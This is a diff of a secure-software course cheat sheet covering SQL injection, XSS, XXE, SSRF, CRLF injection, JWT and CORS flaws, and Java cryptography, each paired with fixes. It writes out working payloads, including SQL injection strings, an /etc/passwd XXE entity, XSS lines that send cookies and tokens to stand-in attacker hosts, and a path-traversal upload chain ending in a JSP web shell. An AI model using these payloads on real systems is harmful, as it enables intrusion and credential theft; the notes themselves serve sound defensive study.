@@ -86,7 +86,8 @@
 = 7 (+1) Kingdoms of Software Security Errors (SDL 3 & 4)
 #concept-block(body: [
   #inline("1. Input Validation & Representation")
-  Encoding can bypass validation (same data, different representation).
+  Encoding can bypass validation (same data, different representation). \
+  *Encoding ≠ Encryption*: Base64, URL encoding, hex provide *zero* security → anyone can decode. Never assume encoded data is protected.
   - *Buffer overflow*: Write beyond buffer → modify program flow, crash, inject code
   - *Injection attacks*: Command/SQL/XML injection → execute arbitrary commands
   - *Cross-site scripting (XSS)*: Execute JS in victim's browser → steal credentials
@@ -106,7 +107,7 @@
   #inline("4. Time & State")
   Humans think sequential, computers work parallel → unforeseen interactions.
   - *Deadlock*: Poor locking mechanisms → availability problems
-  - *TOCTOU*: Time of Check to Time of Use — attacker changes resource between check and use
+  - *TOCTOU*: Time of Check to Time of Use → attacker changes resource between check and use
   - *Session ID reuse*: Same ID across auth boundaries → session hijacking
   - *Timing attacks*: Response time reveals info (e.g., password check duration)
 
@@ -136,19 +137,27 @@
   - *Blind SQLi* (no visible errors):
     - *Time-based*: ```sql SLEEP(5)``` causes delay if vulnerable
     - *Boolean-based*: Different response for true/false conditions (e.g., ```sql ' AND 1=1--``` vs ```sql ' AND 1=2--```)
+    - *LIKE extraction*: Character-by-character: ```sql ' AND (SELECT col FROM t) LIKE 'a%'--``` → try each char until response changes
   - *Tautology (always-true)*: ```sql ' OR ''='``` makes WHERE always TRUE:
     - ```sql WHERE (userid=? AND password='') OR ''=''``` → first part fails, but ```sql ''=''``` is TRUE
+    - If app only reads first row: use `LIMIT offset,1` to select which row (e.g., ```sql ' OR 1=1 LIMIT 4,1#``` → 5th row)
   - *UNION attack*:
     1. *Find column count*: Try ```sql ' UNION SELECT 1--```, ```sql ' UNION SELECT 1,2--```, etc. until no error. Use Burp Intruder (Sniper) to automate.
     2. *Extract data*: ```sql ' UNION SELECT col1,col2,... FROM table--``` (columns must match count AND types)
   - *Schema discovery*:
-    - Tables: ```sql UNION SELECT 1,TABLE_NAME,3,... FROM INFORMATION_SCHEMA.SYSTEM_TABLES--```
-    - Columns: ```sql UNION SELECT 1,COLUMN_NAME,3,... FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS WHERE TABLE_NAME='target'--```
+    - Tables: ```sql UNION SELECT TABLE_NAME,... FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--```
+    - Columns: ```sql UNION SELECT COLUMN_NAME,... FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='target'--```
+  - *MySQL functions*:
+    - `LIMIT offset,count` → pagination (`LIMIT 4,1` = 5th row, 0-indexed)
+    - `GROUP_CONCAT(col)` → merge all rows into single string (useful for extracting multiple values)
+    - `CONCAT_WS(':',a,b,c)` → join columns with separator → `a:b:c`
+    - `DATABASE()` → current database name (for INFORMATION_SCHEMA queries)
   - *Comments*: Cut off rest of query (e.g., ```sql admin'--``` ignores ```sql AND pass='...'```)
     - MySQL: ```sql --``` + space after, or ```sql #```
     - Others: ```sql --```
   - *Multiple queries*: `;` separator only works if server uses `executeBatch()`
   - *INSERT injection*: ```sql userpass'), ('admin', 'Superuser', 'adminpass')--```
+  - *Response fingerprinting* (Blind SQLi): Different error for "valid user, wrong pass" vs "invalid user" → oracle for user enumeration
   - *Counter*:
     - *Prepared statements*: Query parsed with `?` placeholders, input bound separately → always data, never code
     - *Escaping* (weaker): Transform `'` → `\'`, error-prone (encoding issues, incomplete escaping)
@@ -159,6 +168,7 @@
     - Linux: ```sh ; whoami``` or ```sh | whoami```
     - Windows: ```sh & ipconfig```
     - If quoted path: close quote first ```sh "; whoami```
+  - *Dangerous metacharacters*: ``` ; | & $ ` ( ) { } [ ] < > \ " ' ```
   - *Counter*: Use IO classes instead of OS runtime, whitelist allowed chars, minimal privileges
 
   #subinline("JSON/XML Injection")
@@ -167,15 +177,15 @@
     - JSON: `myPassword","admin":"true` | XML: `</password><admin>1</admin>`
   - *Counter*: Escape/blacklist special chars (`"`, `{`, `}`, `<`, `>`)
 
-  #subinline("XXE (XML External Entity)")
-  - *Cause*: XML parser processes external entity references in DOCTYPE
-  - *Attack*: Send crafted XML via POST with entity pointing to resource:
+  #subinline("XXE (XML External Entities)")
+  - *Cause*: XML parser resolves `SYSTEM` entities in DOCTYPE, fetching local files or URLs
+  - *Attack*: Define entity pointing to sensitive resource → parser substitutes content
     ```xml
-    <!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
-    <data>&x;</data>
+    <!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <order><name>&xxe;</name></order>
     ```
-  - *Result*: App returns file content. Also usable for SSRF (Server-Side Request Forgery → internal network requests)
-  - *Counter*: Disable external entities in parser, prefer JSON over XML
+  - *Result*: File read, SSRF (`http://localhost/admin`), or blind exfil to attacker server
+  - *Counter*: Disable DTD: `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
 
   #inline("Authentication & Session")
   #subinline("Broken Authentication")
@@ -185,6 +195,8 @@
     - *Counter*: Vague error messages ("Login failed"), CAPTCHA on account creation
   - *Online brute-force*:
     - *Prerequisite*: Unlimited login attempts without account lockout
+    - *Brute force*: Many passwords against ONE user (triggers lockout)
+    - *Password spraying*: ONE password against MANY users (evades per-user lockout, catches weak passwords like "Password1")
     - Burp Intruder: Capture login, mark username + password, remove Cookie header, *Cluster bomb* attack
     - Find valid credentials: Look for *outliers* (different status code or response length)
     - *Counter*: Rate limiting (e.g., 60s delay after 3 failures). Do NOT lock accounts → enables DoS (Denial of Service). Enforce password quality + check against common password lists
@@ -199,18 +211,15 @@
     - Works if app supports session ID in URL (e.g., `;jsessionid=...`)
     - Basic: Attacker logged in → sends link with session ID → victim uses attacker's account → victim adds credit card → attacker sees it
     - *Powerful variant*: Attacker creates unauthenticated session → victim clicks link → victim logs in → if session ID not rotated, attacker now has authenticated session
-  - *Counter*:
-    - Use long random session IDs (≥128 bits entropy)
-    - *Change session ID after login* (prevents fixation)
-    - Only use cookies for session ID (not URL)
-    - Session inactivity timeout (e.g., 10 min)
+  - *Counter*: Long random IDs (≥128 bits), *change on login*, cookies only (not URL), timeout.
 
   #inline("XSS (Cross-Site Scripting)")
   *Core idea*: Attacker injects JS code into web page viewed by other users → JS executes in victim's browser
 
-  - *Attack possibilities*: Steal cookies (`document.cookie`), fake login form, send requests in victim's session
+  - *Attack possibilities*: Steal cookies (`document.cookie`), steal tokens (`localStorage.getItem('token')`), fake login form, send requests in victim's session
   - *POST via XSS*: Hidden form + auto-submit (`document.forms[0].submit()`)
   - *Testing*: ```js <script>alert("XSS");</script>``` → if popup appears, vulnerable
+  - *Exfiltration*: `<script>fetch('https://attacker/x?c='+document.cookie)</script>` or with `localStorage.getItem('token')`
 
   #subinline("Reflected (Server) XSS")
   - Victim clicks link with JS in parameter → server reflects JS back → browser executes it
@@ -230,12 +239,35 @@
     - `Content-Security-Policy: default-src 'self'; script-src scripts.example.com`
     - Embedded JS not executed → must load from external files → attacker can't inject inline scripts
 
+  // TODO: elaborate on this with session vs cookie vs authorization, credtionals etc
+  #subinline("Token Storage & XSS")
+  - *HttpOnly cookies*: JS cannot read (`document.cookie` blocked), but XSS can still *send* requests (browser auto-attaches)
+  - *localStorage/sessionStorage*: Always accessible to JS → XSS = instant token theft
+  - *Where to store*: SSR → HttpOnly cookies (session-based). REST API → sessionStorage (private per tab, no CSRF). Avoid localStorage (persists, shared).
+
   #subinline("DOM-based XSS")
   - Server NOT involved → client JS reads untrusted data (URL, DOM) and processes insecurely
-  - *`#` fragment*: Attacker puts JS after `#` in URL → not sent to server (server can't detect) → but client JS reads it via DOM
-  - *Dangerous functions*: `unescape()` (decodes URL-encoded chars), `eval()` (executes string as JS)
-  - Example: `?data=19#data=19;alert('XSS')` → `eval("13 * 19;alert('XSS')")`
-  - *Counter*: Avoid `eval()`, validate/sanitize in client-side JS
+  - *`#` fragment*: Attacker puts JS after `#` in URL → *never sent to server* → WAF/logging can't detect it
+    - Example: `https://target/page#<img src=x onerror="fetch('https://attacker?c='+document.cookie)">`
+  - *Dangerous sinks*: `eval()`, `setTimeout(string)`, `innerHTML`, `document.write()`
+  - *Counter*: Avoid `eval()`, use `textContent` instead of `innerHTML`, validate/sanitize in client-side JS
+
+  #subinline("SVG XSS")
+  SVG is XML and can contain `<script>` tags. If app serves uploaded SVGs, scripts execute on render.
+  ```xml
+  <?xml version="1.0"?>
+  <svg xmlns="http://www.w3.org/2000/svg">
+    <script>fetch('https://attacker?t='+localStorage.getItem('token'))</script>
+  </svg>
+  ```
+  - Fix: Strip scripts from SVGs, serve as `Content-Disposition: attachment`, or convert to PNG
+
+  #subinline("Filter Bypass Techniques")
+  Many filters block `<script>` but miss event handlers and alternative vectors:
+  - `<img src=x onerror="...">` → fires when image fails to load
+  - `<input onfocus="..." autofocus>` → fires immediately on page load
+  - `<svg onload="...">`, `<body onload="...">`, `<marquee onstart="...">`
+  - Token theft via `<img>` bypasses CORS: `<img src="https://evil.com?c="+document.cookie>` (images load cross-origin)
 
   #inline("Broken Access Control")
   #subinline("Function Level")
@@ -243,7 +275,6 @@
   - *Finding URLs*: Guess patterns (`/customer` → `/admin`), access logs, open-source code
   - *Counter*: Check user role/permissions before granting URL access (usually framework-configurable)
 
-  #colbreak()
 
   #subinline("Object Level")
   User abuses function to access *objects* they shouldn't (e.g., `?pid=1` → `?pid=2`)
@@ -258,7 +289,7 @@
   - *Multi-step*: `fetch()` + `async/await` chains requests
   - *Counter*:
     - CSRF token: Random per-user token in session, include in requests, server compares
-    - SameSite cookie: `None` (all) | `Lax` (GET only, default) | `Strict` (never) — still use CSRF tokens!
+    - SameSite cookie: `None` (all) | `Lax` (GET only, default) | `Strict` (never) → still use CSRF tokens!
 
   #inline("Testing Tools")
   #subinline("Dynamic (Vulnerability Scanners)")
@@ -352,8 +383,8 @@
 
   #subinline("Why Problem NOT Solved")
   - Protection features not always enabled/available (embedded, mobile, sensors)
-  - *Read overflows* not prevented by these measures
-  - Bypass techniques exist: *Return-Oriented Programming (ROP)*
+  - *Read overflows* not prevented → reading past buffer leaks secrets from stack (like Heartbleed)
+  - *ROP (Return-Oriented Programming)* bypasses NX: chain existing code snippets ("gadgets") ending in `ret` to build arbitrary computation without injecting new code
   - Detection = termination → *availability* impact
   - *Conclusion*: Prevent in code, treat protections as second line of defense (defense in depth)
 
@@ -362,8 +393,6 @@
   - Hard to detect in testing (controlled environments), hard to reproduce
   - Kingdom: *Time and State*
   - Usually robustness/availability issues, but can have *security implications*
-
-  #colbreak()
 
   #subinline("Thread-Based Race Condition")
   ```java
@@ -375,7 +404,7 @@
 
   Fix: Return ID directly from create(), don't use shared variable
 
-  Also: `Random` not cryptographically secure → use `SecureRandom` (API Abuse)
+  Also: `Random` not cryptographically secure → use `SecureRandom` (predictable output enables session hijacking)
 
   #subinline("TOCTOU (Time-of-Check, Time-of-Use)")
   ```c
@@ -487,15 +516,14 @@
   ```
   Password-based keys are *weak* → use long random data or proper key derivation (PBKDF2).
 
-  #colbreak()
-
   #subinline("Symmetric Encryption (Cipher)")
-  `Cipher.getInstance("algo/mode/padding")` — *"AES" alone defaults to AES/ECB/PKCS5Padding!*
+  `Cipher.getInstance("algo/mode/padding")` → *"AES" alone defaults to AES/ECB/PKCS5Padding!*
   - *ECB*: Never use! Identical blocks → identical ciphertext (leaks patterns)
   - *CBC*: + MAC (Message Authentication Code) for integrity
   - *GCM*: Authenticated (confidentiality + integrity built-in)
   - *CTR*: Stream mode
   CBC/GCM/CTR need *IV* (Initialization Vector): random, *never reuse with same key!*
+  - *IV reuse breaks security*: CTR/GCM reuse → XOR of plaintexts recoverable. GCM reuse → auth key leaked, forgery possible.
   ```java
   // CBC: needs separate MAC for integrity
   cipher.init(mode, key, new IvParameterSpec(iv));
@@ -505,10 +533,43 @@
   `update()` for chunks, `doFinal()` for final block + padding. \
   *doFinal resets cipher* → must call `init()` with new IV before reusing!
 
+  #subinline("MAC (Message Authentication Code)")
+  - Keyed hash → verifies integrity *and* authenticity (unlike plain hash)
+  - Attacker can't forge valid MAC without the secret key
+  - Common: HMAC-SHA256, Poly1305
+
+  #subinline("Encrypt-then-MAC vs MAC-then-Encrypt")
+  - *Encrypt-then-MAC* (correct): Encrypt data → MAC the ciphertext
+    - MAC rejects invalid messages *before* decryption (no padding oracle)
+  - *MAC-then-Encrypt* (bad): MAC plaintext → encrypt both → timing attacks possible
+  - *GCM mode*: Built-in authentication, no separate MAC needed
+
+  #subinline("JPA Field Encryption")
+  Encrypt sensitive entity fields at rest using `@Convert`:
+  ```java
+  @Entity class User {
+    @Convert(converter = AESConverter.class)
+    private String creditCard;  // Auto-encrypted on save, decrypted on load
+  }
+  // Converter stores: Base64(IV || Ciphertext)
+  ```
+
+  #subinline("Additional Authenticated Data (AAD)")
+  GCM can authenticate header data without encrypting it:
+  ```java
+  cipher.updateAAD(headerBytes);  // header authenticated but not encrypted
+  cipher.doFinal(payload);        // payload encrypted + authenticated
+  ```
+  Use for file headers, metadata that must be readable but tamper-proof.
+
+  #subinline("Stream Cipher Specifics")
+  - *CHACHA20*: 12-byte nonce, counter starts at 1: `new ChaCha20ParameterSpec(nonce, 1)`
+  - *RC4*: No IV (stream initialized from key only) → deprecated, don't use for new code
+
   #subinline("Public Key Cryptography")
   - *Key pair:* `KeyPairGenerator.getInstance("RSA")` → `initialize(2048)` → `generateKeyPair()`
   - *RSA encryption:* `Cipher.getInstance("RSA/ECB/OAEPPadding")`, encrypt with `pubKey`, decrypt with `privKey`
-    - "ECB" here is just Java naming — RSA encrypts entire message as one block (no chaining like AES ECB)
+    - "ECB" here is just Java naming → RSA encrypts entire message as one block (no chaining like AES ECB)
     - Limited to key size (2048-bit → max 256 bytes) → use *hybrid encryption* for large data
   - *Hybrid encryption:* RSA too slow/limited for large data → combine RSA + AES:
     - Generate random AES session key, encrypt data with AES (fast, unlimited size)
@@ -525,6 +586,26 @@
   - *Digital signatures:* `Signature.getInstance("SHA256withRSA")`
     - Sign: `initSign(privKey)` → `update(data)` → `sign()`
     - Verify: `initVerify(pubKey)` → `update(data)` → `verify(signature)`
+
+  #subinline("Loading Keys from Files")
+  ```java
+  // Private key from PKCS#8 DER file
+  byte[] keyBytes = Files.readAllBytes(Path.of("private.der"));
+  PrivateKey privKey = KeyFactory.getInstance("RSA")
+      .generatePrivate(new PKCS8EncodedKeySpec(keyBytes));
+  // Public key from X.509 certificate
+  CertificateFactory cf = CertificateFactory.getInstance("X.509");
+  Certificate cert = cf.generateCertificate(new FileInputStream("cert.pem"));
+  PublicKey pubKey = cert.getPublicKey();
+  ```
+
+  #subinline("JCA Security Rules")
+  - *Never* use `java.util.Random` for crypto → always `SecureRandom`
+  - *Never* use ECB mode → use CBC+MAC, GCM, or CTR
+  - *RSA padding*: Use `RSA/ECB/OAEPPadding`, not PKCS1 (padding oracle attacks)
+  - *GCM auth tag*: Always 128 bits (`new GCMParameterSpec(128, iv)`)
+  - *IV/Nonce*: Generate randomly with `SecureRandom`, never reuse with same key
+  - *Encrypt-then-MAC*: MAC the ciphertext, not plaintext (or use GCM)
 
   #inline("JSSE (Java Secure Sockets Extension)")
   TLS sockets for secure communication. TLS 1.2/1.3 enabled by default (1.0/1.1 disabled, SSL not supported).
@@ -582,12 +663,13 @@
   - Specific: `404.html`, `500.html` in `/templates/error/`
   - *Remove* debug settings from `application.properties` (include-exception, include-stacktrace)
 
-  #inline("XSS Prevention (Data Sanitation)")
-  *Always sanitize* regardless of input validation. Thymeleaf: `th:text` = safe (encodes `<`), `th:utext` = *unsafe*. \
-  Sanitize ALL external data: user input, DB, files, 3rd party systems.
+  #inline("XSS Prevention (Spring/Thymeleaf)")
+  *Always sanitize output* regardless of input validation. Sanitize ALL external data: user input, DB, files, 3rd party.
+  - Thymeleaf: `th:text` = safe (auto-encodes `<>&"`), `th:utext` = *unsafe* (renders raw HTML)
+  - File uploads: Validate Content-Type, store outside webroot, strip scripts from SVGs
 
   #inline("SQL Injection Prevention")
-  *Never* string concatenation. Use *prepared statements* with `?` placeholders.
+  *Never* string concatenation. Use *prepared statements* → query parsed first, then values bound as data (never code).
   ```java
   String sql = "SELECT * FROM Product WHERE desc LIKE ?";
   jdbcTemplate.query(sql, mapper, "%" + desc + "%"); // safe - '?' escaped
@@ -639,6 +721,24 @@
   ```
   *Login form requirements:* action=`/public/login`, params: `username`, `password`.
 
+  #subinline("Username Enumeration")
+  Different error messages reveal if user exists → enables targeted attacks.
+  - "Unknown user" vs "Wrong password" → attacker learns valid usernames
+  - *Fix*: Generic message for all failures: "Invalid credentials"
+
+  #subinline("Login Throttling")
+  Prevent brute-force/password spraying. Strategy effectiveness:
+  - *Session ID*: Easily bypassed (attacker just gets new session) - worst
+  - *IP address*: Stops weak attackers, bypassed with proxies/Tor - medium
+  - *Username-based*: Effective even against botnets - best (recommended)
+
+  *Implementation rules*:
+  - Block after N failures (e.g., 3) for X seconds (e.g., 60)
+  - Use `ConcurrentHashMap` for thread-safe tracking
+  - *Never use `sleep()`* → causes thread exhaustion under attack
+  - *Don't track non-existing usernames* → prevents DoS (attacker can't lock out arbitrary users)
+  - IP bypass: `proxychains -q curl -s -u "user:pass" http://target`
+
   #inline("Role-Based Access Control")
   Define roles → assign to users → map roles to resources in `SecurityConfig`.
   ```java
@@ -657,6 +757,19 @@
   *Advantages:* Fine-grained control, works for internal calls (not just HTTP). Can combine both for *defense in depth*.
 
   *UI hiding not enough!* `sec:authorize="hasRole('SALES')"` hides buttons in Thymeleaf, but user can still craft requests → *always enforce server-side*.
+
+  #subinline("Mass Assignment")
+  API binds all JSON fields to object → attacker adds unexpected fields (e.g., `"role": "admin"`).
+  - Frameworks auto-bind request body to entity without whitelisting
+  - *Fix*: Use DTOs with only allowed fields, explicit mapping in service layer
+  ```java
+  // WRONG: binds ALL fields including "role"
+  public void update(@RequestBody User user) { userRepo.save(user); }
+  // RIGHT: DTO with only allowed fields
+  public void update(@RequestBody UserUpdateDTO dto) {
+    user.setAddress(dto.getAddress()); // explicit mapping
+  }
+  ```
 
   #inline("CSRF Protection")
   Spring Security default: CSRF token stored in session, included as hidden field `_csrf` in forms (POST only).
@@ -692,6 +805,22 @@
   server.servlet.session.timeout=10m
   ```
 
+  #subinline("Secure Password Change")
+  *Always verify old password* before allowing change (prevents session hijacking abuse):
+  ```java
+  if (!passwordEncoder.matches(oldPassword, user.getHash())) {
+    throw new AccessDeniedException("Wrong password");
+  }
+  user.setPasswordHash(passwordEncoder.encode(newPassword));
+  ```
+
+  #subinline("Spring Security Filter Chain")
+  Custom filters execute in order added, before authentication filter:
+  ```java
+  http.addFilterBefore(throttlingFilter, UsernamePasswordAuthenticationFilter.class)
+      .addFilterBefore(validationFilter, UsernamePasswordAuthenticationFilter.class);
+  ```
+
   #inline("Input Validation (Bean Validation)")
   Jakarta EE framework: *whitelisting* approach (define what's allowed).
   ```java
@@ -716,20 +845,104 @@
   #subinline("Custom Validation")
   Create annotation with `@Constraint(validatedBy = MyValidator.class)` + class implementing `ConstraintValidator<AnnotationType, FieldType>` with `isValid()` method.
 
+  #subinline("Input Bounds (DoS Prevention)")
+  Unbounded input causes `OutOfMemoryError` → attacker sends huge data, server allocates memory until crash. Must limit *both* individual item size AND total count.
+
+  *Attack vectors*:
+  - *Single huge line*: `BufferedReader.readLine()` buffers entire line in memory. Attacker sends 5GB without newline → OOM. Fix: Read char-by-char, reject after limit (e.g., 1000 chars).
+  - *Many small lines*: `StringBuilder.append()` in loop accumulates all lines. Attacker sends millions of 100-byte lines → OOM. Fix: Count lines, reject after limit (e.g., 1000 lines).
+  - *Malformed request*: Server crashes parsing invalid format. Fix: Validate format with regex *before* processing.
+
+  *Why `-Xmx` doesn't help*: Increasing heap just delays crash → attacker can always send more. Root cause is unbounded allocation, not heap size.
+
+  *Defense pattern*:
+  - Set hard limits: max line length (1000 chars), max lines (1000), max file size (10MB)
+  - Validate request format early: `^(GET|PUT) [\\x21-\\x7E]+$` rejects malformed requests before parsing
+  - Fail fast: Reject oversized input immediately, don't try to process partial data
+
+  *Bounded line reading* (prevents OOM from `readLine()`):
+  ```java
+  String readLineMaxChar(Reader r, int max) throws IOException {
+    StringBuilder sb = new StringBuilder();
+    int ch;
+    while ((ch = r.read()) != -1) {
+      if (ch == '\n') return sb.toString();
+      if (sb.length() >= max) throw new IOException("Line too long");
+      sb.append((char) ch);
+    }
+    return sb.length() > 0 ? sb.toString() : null;
+  }
+  ```
+
+  #subinline("Path Traversal")
+  Attacker uses `../` to escape intended directory: `/files/../../../etc/passwd`
+  - *Encoding bypass*: `%2F` bypasses validation checking for literal `/`
+  - *Key principle*: Decode first → validate → use
+  ```java
+  // WRONG: validate before decode
+  if (filename.contains("/")) reject(); // %2F passes!
+  filename = URLDecoder.decode(filename);
+  // RIGHT: decode first, then validate
+  filename = URLDecoder.decode(filename);
+  if (filename.contains("/") || filename.contains("..")) reject();
+  ```
+
+  #subinline("Command Injection")
+  User input passed to shell without sanitization → *RCE* (Remote Code Execution).
+  - Metacharacters: `;` (chain), `&&` (on success), `||` (on failure), `|` (pipe)
+  - Example: `ping $input` → attacker sends `127.0.0.1; cat /etc/passwd`
+  - *Fix*: Use `ProcessBuilder` with array args (no shell), or whitelist allowed values
+
   #subinline("Encoding Attacks")
   Input validation alone may not prevent attacks if app decodes data later.
   - Attacker encodes `<script>` as `%3Cscript%3E` (URL encoding) → passes validation (only letters/digits/%)
   - If app URL-decodes before output → XSS possible
   - *Best practice:* Don't decode, or decode first then validate. Sanitation (encode `<` → `&lt;`) is primary defense.
+
+  #subinline("SSRF (Server-Side Request Forgery)")
+  Server fetches user-supplied URL → attacker accesses internal services not exposed to internet.
+  - *Attack*: Pass URL like `http://localhost:8080/admin` or `http://169.254.169.254/metadata` (cloud metadata)
+  - *Localhost filter bypasses* (when app blocks "localhost" or "127.0.0.1"):
+    - `0.0.0.0` = "all interfaces" on Linux, resolves to localhost
+    - `[::1]` = IPv6 localhost (often forgotten in filters)
+    - `2130706433` = decimal notation for 127.0.0.1
+    - `0x7f000001` = hex notation for 127.0.0.1
+    - `127.0.0.1.nip.io` = DNS rebinding, resolves to 127.0.0.1
+  - *Fix*: Whitelist allowed domains, block ALL private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
+
+  #subinline("CRLF Injection / HTTP Response Splitting")
+  HTTP headers are separated by CRLF (`\r\n`). If user input is included in response headers without sanitization, attacker can inject `%0d%0a` to add arbitrary headers.
+
+  *How it works*: HTTP response structure is `Status\r\nHeader1\r\nHeader2\r\n\r\nBody`. Injecting CRLF lets attacker terminate current header and start new one.
+  - Redirect parameter: `url=/secure/` becomes header `Location: /secure/`
+  - Injected: `url=/secure/%0d%0aSet-Cookie:admin=true`
+  - Result: `Location: /secure/\r\nSet-Cookie:admin=true` → browser sets attacker's cookie!
+
+  *Cookie injection*: Attacker injects auth cookies to impersonate admin.
+  - Payload: `%0d%0aSet-Cookie:session=admin_token`
+  - Server reflects headers → browser stores cookie → next request authenticated as admin
+
+  *Fix*: Strip or reject `\r`, `\n`, `%0d`, `%0a` from any input used in headers/redirects.
+
+  #subinline("File Upload Path Traversal")
+  Server saves uploaded file using client-provided filename without validation. Attacker includes `../` to write outside upload directory → potentially into webroot where files are executed.
+
+  *Attack chain*:
+  1. Find upload endpoint that preserves filename (check response or directory listing)
+  2. Craft filename: `../../webroot/shell.jsp` (adjust `../` count to reach target dir)
+  3. Shell content: JSP that executes URL parameter as command
+  4. Access shell: `https://target/shell.jsp?cmd=cat /etc/passwd`
+
+  *Why it works*: Upload dir might be `/app/uploads/`, but `../../webroot/` resolves to `/app/webroot/` where Tomcat executes JSP files.
+
+  *Fix*: Never trust client filename. Generate random name server-side, validate extension whitelist, store outside webroot, disable execution in upload directory.
 ])
 
 = Secure CSR Web Applications (SDL 3 & 4)
 
 #concept-block(body: [
-  #inline("REST API Basics")
-  - *Stateless*: No sessions, every request must include all info (auth token) for server to process
-  - *HTTP methods*: GET (read), POST (create), PUT (replace), PATCH (partial update), DELETE (delete)
-  - *JSON format* for data, meaningful URLs (e.g., `/customers/1234`)
+  #inline("REST API Security")
+  *Stateless* = no server-side sessions. Every request must carry auth token (JWT). This changes the threat model: no session fixation, but token theft/forgery becomes primary risk.
 
   #subinline("Spring REST Controller")
   ```java
@@ -745,6 +958,38 @@
   }
   ```
 
+  #subinline("IDOR (Insecure Direct Object Reference)")
+  API uses predictable IDs (sequential integers) to reference resources, but doesn't verify the requester is authorized to access that specific resource. Having a valid JWT proves *identity*, not *authorization* for every resource.
+
+  *Attack*: User A is authenticated, has access to `/api/creditcard/1234`. Attacker increments ID → `/api/creditcard/1235` returns User B's credit card. Server only checked "is user logged in?" not "does this card belong to this user?"
+
+  *Fix*: Every resource access must verify ownership. Extract user ID from JWT/session, compare against resource owner:
+  ```java
+  if (!creditCard.getOwnerId().equals(currentUser.getId())) throw new AccessDeniedException();
+  ```
+
+  #subinline("Excessive Data Exposure")
+  API returns entire database entities instead of tailored responses. Backend sends all fields, relies on frontend to hide sensitive ones → but attacker can read raw API response.
+
+  *Example*: `/api/user/123` returns `{name, email, passwordHash, ssn, internalNotes}` → frontend only displays name/email, but attacker sees everything in Network tab. Worse: attacker enumerates IDs 1-10000, harvests all password hashes for offline cracking.
+
+  *Fix*: Use DTOs (Data Transfer Objects) that explicitly whitelist fields. Never return entity directly:
+  ```java
+  // BAD: returns everything including passwordHash
+  return userRepository.findById(id);
+  // GOOD: returns only allowed fields
+  return new UserDTO(user.getName(), user.getEmail());
+  ```
+
+  #subinline("Cookie-Based Access Control Flaws")
+  Server uses separate cookies for authentication (`auth_token`) and user identification (`user_id`), but only validates the auth token → trusts `user_id` cookie blindly.
+
+  *Attack*: Attacker logs in (gets valid `auth_token`), then changes `user_id` cookie from `123` to `1` (admin). Server checks auth token (valid!), reads user ID from cookie (trusts it!), returns admin's data.
+
+  *Root cause*: User ID should be derived from the authenticated session/token, never from a separate client-controllable value.
+
+  *Fix*: Extract user identity *only* from the verified JWT payload or server-side session. Never trust client-provided user IDs.
+
   #inline("JWT Authentication")
   Why JWT? Sending username/password every request = expensive bcrypt hash. \
   JWT = token issued once, verified cheaply with HMAC. Stateless (server stores nothing).
@@ -755,19 +1000,31 @@
   - *Payload*: `{"iss":"...", "sub":"alice", "exp":"..."}` (issuer, subject, expiry)
   - *MAC*: `HMAC-SHA256(header.payload, secretKey)` → can't forge without key
 
-  #colbreak()
-
   #subinline("Flow")
   1. Client POSTs credentials → server verifies against DB
   2. Server creates JWT with username, returns it
   3. Client includes JWT in every request: `Authorization: Bearer <token>`
   4. Server validates JWT, extracts username, sets `SecurityContext` for *this request only*
 
+  #subinline("JWT Attacks")
+  - *Algorithm None*: Set `alg: "none"` → empty signature (`header.payload.`) bypasses verification
+    - Fix: Whitelist allowed algorithms, reject "none"
+  - *Weak Secret*: Short secrets crackable offline with hashcat/john (`-m 16500`)
+    - Fix: Use ≥256-bit random secret (`openssl rand -base64 32`)
+  - *Token Leakage*: Exposed in docs/logs/git history → Use short-lived tokens (15-30 min)
+
   #inline("Exception Handling")
   - *401 Unauthorized*: `CustomAuthenticationEntryPoint` (missing/invalid JWT)
   - *403 Forbidden*: `CustomAccessDeniedHandler` (valid JWT but wrong role)
   - *400 Bad Request*: `GlobalExceptionHandler` (`@RestControllerAdvice`)
     - `InvalidParameterException`, `MethodArgumentNotValidException`, `ConstraintViolationException`, `MethodArgumentTypeMismatchException`
+
+  *Throwing exceptions in code*:
+  ```java
+  throw new AccessDeniedException("");        // → 403 Forbidden
+  throw new InvalidParameterException("msg"); // → 400 Bad Request
+  throw new RuntimeException("msg");          // → 500 Internal Server Error
+  ```
 
   #inline("SecurityConfig for REST")
   ```java
@@ -804,6 +1061,15 @@
   config.setAllowedMethods(Arrays.asList("OPTIONS", "GET", "POST", "DELETE"));
   config.setAllowedHeaders(Arrays.asList("*"));
   ```
+  // TODO: explain this fucking headers also with credentials allow and also the content type shit
+  #subinline("CORS Origin Reflection Attack")
+  Server blindly reflects any `Origin` header → complete data theft:
+  ```java
+  // VULNERABLE: reflects any origin
+  response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
+  response.setHeader("Access-Control-Allow-Credentials", "true");
+  ```
+  Attacker's site reads victim's data with `credentials: 'include'`. *Fix*: Whitelist specific origins.
 
   #inline("Client-Side Security")
 
@@ -811,6 +1077,12 @@
   - *Best*: Restrict `Access-Control-Allow-Origin` to specific origin (not `*`)
   - Use `Authorization` header with JWT, *not cookies*
   - JWT in session storage = not accessible from different origin → CSRF blocked
+
+  #subinline("CSRF Content-Type Bypass")
+  `Content-Type: text/plain` = "simple request" → *no CORS preflight*!
+  - Server may still parse body as JSON despite wrong Content-Type
+  - Attacker sends `text/plain` with JSON body + victim's cookies → CSRF works
+  - *Fix*: Validate Content-Type header server-side, use SameSite cookies
 
   #subinline("Token Storage")
   - *Session storage* (preferred): private per tab, deleted on browser close
@@ -825,6 +1097,13 @@
   - *DOM-based XSS*: Client-side code processes untrusted data (URL params, DOM elements)
   - *Prevention*: Use framework's default sanitization
     - Angular: `{{ variable }}` = safe (sanitized), `[innerHTML]` with pipes = unsafe
+
+  #subinline("Content-Type Confusion XSS")
+  API returns `Content-Type: text/html` instead of `application/json`:
+  - Browser executes `<script>` in JSON response as HTML
+  - Attacker stores JS in comment field → victim views → token stolen via `<img src="attacker.com?t=TOKEN">`
+  - `<img>` bypasses CORS (only applies to fetch/XHR, not HTML tags)
+  - *Fix*: Return correct `Content-Type: application/json`, sanitize input
 
   #inline("Security Checklist")
   1. Configure CORS restrictively (specific origins, not `*`)
@@ -1013,5 +1292,101 @@
